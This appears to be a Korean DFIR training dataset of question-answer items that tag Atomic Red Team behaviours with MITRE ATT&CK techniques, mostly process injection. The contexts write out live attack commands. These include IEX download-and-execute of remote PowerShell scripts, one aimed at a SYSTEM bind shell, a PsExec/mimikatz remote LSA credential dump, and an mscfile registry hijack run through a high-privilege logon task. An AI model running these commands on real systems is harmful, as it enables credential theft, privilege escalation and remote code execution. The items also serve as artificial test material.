{"id": "T1053.005_T1053.005-12_Q12", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1053.005 Scheduled Task/Job: Scheduled Task (Tactic: Execution)\n[요약] CompMgmt 기법과 동일하게 mscfile 핸들러를 하이재킹하지만, eventvwr.msc를 대상으로 한다. ONLOGON 트리거로 eventvwr.msc를 실행하는 작업을 만들고, .msc 오픈 명령을 calc.exe로 변경해 작업 실행 시 calc.exe가 실행되도록 한다.\n[절차] 관리자 권한 cmd.exe에서 reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f 명령을 실행해 .msc 오픈 핸들러를 변경한다. schtasks /Create /TN \"#{task_name}\" /TR \"eventvwr.msc\" /SC ONLOGON /RL HIGHEST /F 명령을 실행해 로그온 시 이벤트 뷰어 콘솔을 실행하는 스케줄 작업을 생성한다. ECHO 메시지 후 schtasks /Run /TN \"EventViewerBypass\" 명령으로 방금 생성한 작업을 수동 실행한다. 레지스트리 하이재킹으로 인해 eventvwr.msc 대신 calc.exe(또는 지정한 #{payload})가 실행되는지 확인한다. 이후 실제 사용자 로그온 시에도 동일하게 #{payload}가 실행되어 지속성이 유지되는지 관찰한다.\n[대표 명령 예시]\nreg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\r\nschtasks /Create /TN \"#{task_name}\" /TR \"eventvwr.msc\" /SC ONLOGON /RL HIGHEST /F\r\nECHO Let's run the schedule task ...\r\nschtasks /Run /TN \"EventViewerBypass\"", "answer": "이 행위는 MITRE ATT&CK의 T1053.005 \"Scheduled Task/Job: Scheduled Task\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] 64비트 MS Word 매크로(VBA)와 Invoke-MalDoc.ps1을 이용해 새 프로세스에 셸코드를 인젝션하고 실행하는 시나리오.\n[절차] PowerShell을 관리자 권한(또는 적절한 권한)으로 실행한다. 사전 조건으로 64비트 Microsoft Word가 설치되어 있는지, 그리고 #{txt_path} 위치에 T1055-macrocode.txt가 존재하는지 확인한다. 다음 명령으로 TLS 1.2를 강제하고 Invoke-MalDoc.ps1을 내려받아 메모리에 로드한다. [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) Invoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\" 명령을 실행해 Word 매크로를 구동한다. 매크로는 지정된 셸코드를 새 프로세스에 인젝션 후 실행한다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\r\nInvoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\"", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] PsExec를 이용해 원격 시스템의 mimikatz를 실행하고, /inject 옵션으로 LSASS 프로세스에 코드 인젝션 후 RID 500 계정의 크리덴셜을 덤프하는 시나리오.\n[절차] #{mimikatz_path} 위치에 mimikatz.exe가 존재하는지 확인하고, 없으면 Invoke-FetchFromZip를 이용해 최신 릴리스를 다운로드하여 배치한다. #{psexec_path} 경로에 PsExec.exe가 존재하는지 확인하고, 없으면 PSTools.zip을 내려받아 복사한다. PsExec를 이용해 원격 호스트 #{machine}에 접속하고 mimikatz를 원격 실행한다. \"#{psexec_path}\" /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\" 명령을 실행한다. 원격 시스템의 LSASS 프로세스에 코드가 인젝션되고, RID 500 계정에 대한 LSA 시크릿/크리덴셜이 덤프된다.\n[대표 명령 예시]\n\"#{psexec_path}\" /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\"", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] InjectView.exe를 사용해 섹션 오브젝트/뷰를 통해 타겟 프로세스에 셸코드를 매핑하고, 원격 스레드를 생성하는 섹션 뷰 기반 인젝션 테스트.\n[절차] PowerShell에서 $notepad = Start-Process notepad -passthru 명령으로 타겟 프로세스(notepad)를 시작한다. Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\" 명령을 실행한다. InjectView.exe는 로컬 섹션 오브젝트를 생성하고, 로컬 뷰에 셸코드를 복사한 뒤, notepad 프로세스에 원격 섹션 뷰를 생성해 그 주소를 스레드 시작점으로 사용한다. 메시지 박스/계산기 등 셸코드 동작이 발생하는지 관찰한다.\n[대표 명령 예시]\n$notepad = Start-Process notepad -passthru\r\nStart-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\"", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] calc.exe를 부모 프로세스로 띄운 뒤, redVanity.exe가 RtlCreateProcessReflection을 사용해 포크된 프로세스에 셸코드를 쓰고 실행하는 \"Dirty Vanity\" 프로세스 인젝션.\n[절차] PowerShell에서 #{pid} 기본값(Start-Process calc.exe -PassThru).Id를 통해 부모 프로세스 calc.exe를 시작하고 PID를 얻는다. Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" #{pid} 명령을 실행한다. redVanity.exe는 RtlCreateProcessReflection을 호출해 부모 프로세스를 포크하고, 자식 프로세스 메모리에 셸코드를 기록 후 실행한다. 메시지 박스와 notepad가 열리는지 확인한다.\n[대표 명령 예시]\nStart-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" #{pid}", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] RWX 권한 섹션을 가진 취약 DLL(msys-2.0.dll)을 이용하여 VirtualAlloc/WriteProcessMemory 없이 로컬 프로세스 내에서 셸코드를 실행하는 MockingJay 스타일 인젝션.\n[절차] #{vuln_dll} 경로에 msys-2.0.dll이 존재하는지 확인하고, 없으면 GitHub에서 다운로드한다. PowerShell에서 searchVuln.exe를 실행하여 취약 섹션의 VirtualAddress를 추출한다. $address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value & \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"#{vuln_dll}\" $address 명령으로 RWX 섹션에 셸코드를 주입하고 스레드를 생성한다. 메시지 박스와 notepad 실행 여부를 확인한다.\n[대표 명령 예시]\n$address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value\r\n& \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"#{vuln_dll}\" $address", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] UUID 문자열을 UuidFromStringA API로 디코딩하여 힙에 셸코드를 적재하고, EnumSystemLocalesA 콜백을 통해 실행하는 Go 기반 인젝션.\n[절차] PowerShell에서 $PathToAtomicsFolder\\T1055\\bin\\x64\\UuidFromStringA.exe -debug 를 실행한다. 프로그램은 UUID 형태로 인코딩된 셸코드를 UuidFromStringA를 통해 바이너리로 변환하고 힙에 저장한다. EnumSystemLocalesA API를 호출하면서 셸코드가 있는 주소를 콜백으로 사용하여 실행한다. CalculatorApp(계산기 앱)이 실행되는지 확인한다.\n[대표 명령 예시]\n$PathToAtomicsFolder\\T1055\\bin\\x64\\UuidFromStringA.exe -debug", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] VirtualAlloc/RtlCopyMemory/VirtualProtect로 셸코드를 준비하고, ntdll!EtwpCreateEtwThread를 사용해 현재 프로세스 내에서 셸코드를 실행하는 Go 기반 인젝션.\n[절차] PowerShell에서 $PathToAtomicsFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug 를 실행한다. 프로그램은 VirtualAlloc로 RW 메모리를 확보하고, RtlCopyMemory로 셸코드를 복사한 뒤 VirtualProtect로 RX로 변경한다. EtwpCreateEtwThread 함수를 호출해 셸코드 주소를 시작점으로 하는 스레드를 생성한다. CalculatorApp가 실행되는지 확인한다.\n[대표 명령 예시]\n$PathToAtomicsFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-8_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] werfault.exe 등 타겟 프로세스를 새로 띄운 후, VirtualAllocEx/WriteProcessMemory/VirtualProtectEx/RtlCreateUserThread 조합으로 원격 프로세스에 셸코드를 인젝션하여 실행.\n[절차] PowerShell에서 $process = Start-Process #{spawn_process_path} -passthru 명령으로 타겟 프로세스를 시작하고 PID를 얻는다. $PathToAtomicsFolder\\T1055\\bin\\x64\\RtlCreateUserThread.exe -pid $process.Id -debug 를 실행한다. 프로그램은 OpenProcess로 핸들을 얻고, VirtualAllocEx로 원격 메모리를 할당한 뒤 WriteProcessMemory로 셸코드를 기록한다. VirtualProtectEx로 실행 권한을 부여하고, RtlCreateUserThread로 원격 스레드를 생성한다. CalculatorApp 및 #{spawn_process_name} 프로세스를 확인한다.\n[대표 명령 예시]\n$process = Start-Process #{spawn_process_path} -passthru\r\n$PathToAtomicsFolder\\T1055\\bin\\x64\\RtlCreateUserThread.exe -pid $process.Id -debug", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-9_Q9", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] golang.org/x/sys/windows 패키지를 활용하여 OpenProcess/VirtualAllocEx/WriteProcessMemory/VirtualProtectEx/CreateRemoteThread로 원격 프로세스에 셸코드를 인젝션하고 실행.\n[절차] PowerShell에서 $process = Start-Process #{spawn_process_path} -passthru 명령으로 타겟 프로세스를 시작한다. $PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThread.exe -pid $process.Id -debug 를 실행한다. 프로그램은 Windows 패키지를 통해 필요한 API를 호출하여 셸코드를 원격 프로세스 메모리에 기록하고 CreateRemoteThread로 실행한다. CalculatorApp와 #{spawn_process_name} 프로세스를 확인한다.\n[대표 명령 예시]\n$process = Start-Process #{spawn_process_path} -passthru\r\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThread.exe -pid $process.Id -debug", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-10_Q10", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] Kernel32.dll을 직접 로드해 CreateRemoteThread 등 API 주소를 얻고, VirtualAllocEx/WriteProcessMemory/VirtualProtectEx/CreateRemoteThread로 원격 프로세스에 셸코드를 인젝션하는 네이티브 방식.\n[절차] PowerShell에서 $process = Start-Process #{spawn_process_path} -passthru 명령으로 타겟 프로세스를 시작한다. $PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe -pid $process.Id -debug 를 실행한다. 프로그램은 LoadLibrary/GetProcAddress를 통해 Kernel32.dll의 함수 포인터를 직접 구해 인젝션 플로우를 수행한다. CalculatorApp 실행 여부와 #{spawn_process_name} 상태를 확인한다.\n[대표 명령 예시]\n$process = Start-Process #{spawn_process_path} -passthru\r\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe -pid $process.Id -debug", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-11_Q11", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] 현재 프로세스 내 VirtualAlloc/RtlCopyMemory/VirtualProtect/CreateThread/WaitForSingleObject 콜을 이용해 셸코드를 로컬 인젝션 방식으로 실행.\n[절차] PowerShell에서 $PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThread.exe -debug 를 실행한다. 프로그램은 VirtualAlloc로 RW 메모리를 확보하고, RtlCopyMemory로 셸코드를 복사한다. VirtualProtect로 페이지 권한을 RX로 변경한 뒤, CreateThread로 새로운 스레드를 생성하고 WaitForSingleObject로 종료를 대기한다. CalculatorApp가 실행되는지 확인한다.\n[대표 명령 예시]\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThread.exe -debug", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-12_Q12", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] CreateThread/VirtualAlloc/VirtualProtect/RtlCopyMemory 등을 직접 DLL 로딩/함수 포인터 획득 방식으로 호출하여 현재 프로세스 내 셸코드를 실행하는 네이티브 CreateThread 인젝션.\n[절차] PowerShell에서 $PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug 를 실행한다. 프로그램은 ntdll/kernel32 등을 직접 로딩해 필요한 API 주소를 획득한 뒤, 셸코드를 메모리에 복사하고 CreateThread로 실행한다. CalculatorApp가 실행되는지 확인한다.\n[대표 명령 예시]\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055_T1055-13_Q13", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055 Process Injection (Tactic: Defense Evasion)\n[요약] NCC Group의 UUID 인젝션 아이디어를 확장한 기법으로, 셸코드를 UUID 형태로 힙에 저장하고 커스텀 UUID 변환 함수와 EnumSystemLocalesA만을 이용해 실행하는 PoC(uuid_injection.exe).\n[절차] #{exe_binary} 경로에 uuid_injection.exe가 존재하는지 확인하고, 없으면 GitHub에서 다운로드한다. PowerShell에서 Start-Process \"#{exe_binary}\" 를 실행하여 PoC를 시작한다. 프로그램은 커스텀 UuidToString/UuidFromString 구현을 사용해 UUID 문자열을 바이너리 셸코드로 변환하고 힙에 적재한다. EnumSystemLocalesA API를 사용해 셸코드 주소를 콜백으로 호출하여 실행한다. 셸코드 실행 결과로 메시지 박스와 notepad가 열리는지 확인한다. 7초 후 Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force 로 notepad를 종료한다.\n[대표 명령 예시]\nStart-Process \"#{exe_binary}\"\r\nStart-Sleep -Seconds 7\r\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force", "answer": "이 행위는 MITRE ATT&CK의 T1055 \"Process Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055.001_T1055.001-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055.001 Process Injection: Dynamic-link Library Injection (Tactic: Defense Evasion)\n[요약] 공식 Windows 유틸리티인 mavinject.exe를 이용해, 실행 중인 프로세스(기본: notepad)에 T1055.001.dll을 인젝션하는 DLL Injection 시나리오.\n[절차] 1) PowerShell에서 테스트용 DLL 경로 #{dll_payload}가 존재하는지 확인한다.    - 존재하지 않으면 get_prereq가 GitHub에서 T1055.001.dll을 다운로드하여 #{dll_payload} 위치에 저장한다. 2) PowerShell에서 대상 프로세스를 시작하고 PID를 확보한다.    - 기본값: #{process_id} → (Start-Process notepad -PassThru).Id 로 notepad.exe를 실행하고 PID를 반환. 3) mavinject.exe를 사용하여 대상 프로세스에 DLL을 인젝션한다.    - $mypid = #{process_id}    - mavinject $mypid /INJECTRUNNING \"#{dll_payload}\" 4) 인젝션 결과로 notepad 아이콘이 보이는 메시지 박스가 나타나는지 확인한다. 5) 테스트 종료 후 Stop-Process -processname notepad 명령으로 notepad를 종료한다.\n[대표 명령 예시]\n$mypid = #{process_id}\r\nmavinject $mypid /INJECTRUNNING \"#{dll_payload}\"\r\nStop-Process -processname notepad", "answer": "이 행위는 MITRE ATT&CK의 T1055.001 \"Process Injection: Dynamic-link Library Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055.001_T1055.001-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055.001 Process Injection: Dynamic-link Library Injection (Tactic: Defense Evasion)\n[요약] WinPwn 스크립트(Get-UsoClientDLLSystem.ps1)를 이용해 UsoClient의 DLL 로드 동작을 악용, SYSTEM 권한 쉘을 바인드하는 DLL 로드/인젝션 기반 LPE 시나리오.\n[절차] 1) PowerShell을 관리자 권한으로 실행한다(권장). 2) 아래 명령을 실행해 GitHub에 호스팅된 Get-UsoClientDLLSystem.ps1를 메모리로 다운로드 후 즉시 실행한다.    - iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1') 3) 스크립트는 UsoClient의 DLL 로드 메커니즘을 악용하여 DLL 로딩 경로를 하이재킹(hijack)하고, SYSTEM 권한을 가진 바인드 쉘(또는 지정된 페이로드)을 생성하려 시도한다. 4) 성공 시, SYSTEM 권한 컨텍스트에서 명령 실행 혹은 바인드된 포트로 접속이 가능해진다(스크립트 옵션에 따라 상이).\n[대표 명령 예시]\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')", "answer": "이 행위는 MITRE ATT&CK의 T1055.001 \"Process Injection: Dynamic-link Library Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055.002_T1055.002-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055.002 Process Injection: Portable Executable Injection (Tactic: Defense Evasion)\n[요약] RedInjection.exe를 이용해 원격 notepad 프로세스 메모리에 PE를 인젝션하고, 재배치를 거쳐 실행시키는 시나리오. 성공 시 몇 초 후 \"Warning\" 제목, \"Atomic Red Team\" 내용의 메시지 박스가 표시된다.\n[절차] 1) 사전 준비 단계 (get_prereq):    - 입력 인자 #{exe_binary} 경로에 PE 바이너리(RedInjection.exe)가 존재하는지 확인한다.    - 존재하지 않는 경우:      · (split-path \"#{exe_binary}\") 경로에 디렉토리를 생성한다.      · Invoke-WebRequest로 GitHub에서 RedInjection.exe를 다운로드하여 #{exe_binary} 경로에 저장한다.  2) 인젝션 실행:    - PowerShell에서 Start-Process \"#{exe_binary}\" 를 실행한다.    - RedInjection.exe는 내부적으로 다음과 같은 동작을 수행하는 PE 인젝터 역할을 한다고 가정할 수 있다:      · 대상 프로세스(notepad.exe)를 생성하거나, 이미 실행 중인 notepad 프로세스를 찾는다.      · 대상 프로세스 메모리 영역에 PE 이미지를 할당하고, 섹션 매핑 및 재배치(Base Relocation)를 적용한다.      · IAT(Import Address Table) 해결 및 초기화 코드를 수행한다.      · PE의 EntryPoint로 스레드를 시작하여 코드를 실행한다.    - 성공적으로 인젝션 및 실행이 완료되면, 약간의 지연 후 \"Warning\"이라는 제목과 \"Atomic Red Team\"이라는 내용을 가진 메시지 박스가 나타난다.  3) 테스트 대기 및 종료:    - Start-Sleep -Seconds 7 명령으로 7초 동안 대기하여 메시지 박스 및 인젝션 결과를 확인할 수 있도록 한다.    - 이후 Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force 를 통해 notepad 프로세스를 강제 종료한다.\n[대표 명령 예시]\nStart-Process \"#{exe_binary}\"\r\nStart-Sleep -Seconds 7\r\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force", "answer": "이 행위는 MITRE ATT&CK의 T1055.002 \"Process Injection: Portable Executable Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055.003_T1055.003-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055.003 Thread Execution Hijacking (Tactic: Defense Evasion)\n[요약] notepad.exe를 시작한 뒤, InjectContext.exe를 사용해 해당 프로세스의 스레드 실행 흐름을 하이재킹하는 시나리오이다. 성공 시 1~2초 후 \"Atomic Red Team\" 캡션을 가진 MessageBox가 표시되며, 이후 notepad 프로세스를 종료한다.\n[절차] 1) 대상 프로세스 시작:    - $notepad = Start-Process notepad -PassThru    - PowerShell에서 notepad.exe를 새로 실행하고, -PassThru 옵션으로 프로세스 객체(특히 PID)를 변수 $notepad에 저장한다.  2) 스레드 실행 하이재킹 수행:    - Start-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\"    - InjectContext.exe는 내부적으로 다음과 유사한 단계를 수행하는 스레드 하이재킹 인젝터 역할을 한다고 볼 수 있다:      · 대상 프로세스(notepad)의 핸들을 열고, 해당 프로세스 내 스레드 중 하나의 핸들을 획득한다.      · 대상 프로세스에 셸코드(MessageBox를 띄우는 msfvenom 기반 셸코드)를 위한 메모리 공간을 할당하고, 셸코드를 기록한다.      · GetThreadContext/SetThreadContext 등의 API를 사용해 대상 스레드의 레지스터(특히 명령 포인터)를 셸코드 시작 주소로 변경한다.      · 스레드를 재개/계속 실행시켜, 기존 정상 코드 대신 셸코드가 실행되도록 한다.    - 인젝션 및 스레드 하이재킹이 성공하면, 1~2초 내에 \"Atomic Red Team\" 캡션을 가진 MessageBox가 notepad 컨텍스트에서 표시된다.  3) 대기 및 정리:    - Start-Sleep -Seconds 5 로 5초간 대기하여 MessageBox 표시와 스레드 실행 결과를 확인할 수 있도록 한다.    - 이후 Stop-Process $notepad.Id 로 notepad 프로세스를 강제 종료하여 실험을 종료한다.\n[대표 명령 예시]\n$notepad = Start-Process notepad -passthru\r\nStart-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\"\r\nStart-Sleep -Seconds 5\r\nStop-Process $notepad.id", "answer": "이 행위는 MITRE ATT&CK의 T1055.003 \"Thread Execution Hijacking\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
